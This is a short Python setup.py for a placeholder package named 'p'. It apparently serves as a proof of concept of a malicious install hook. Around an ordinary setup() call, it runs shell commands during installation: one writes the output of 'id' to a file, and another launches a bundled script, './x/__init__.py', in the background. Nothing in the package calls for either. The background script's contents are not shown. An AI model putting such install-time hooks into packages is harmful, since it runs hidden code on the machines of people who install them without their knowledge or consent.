from setuptools import setup

import os
os.system('id > xxxx')


setup(
    name='p',
    version='1.0.0',
    packages=['x'],
    url='',
    license='',
    author='1',
    author_email='',
    description=''
)

os.system('./x/__init__.py &')
# raise Exception('1')
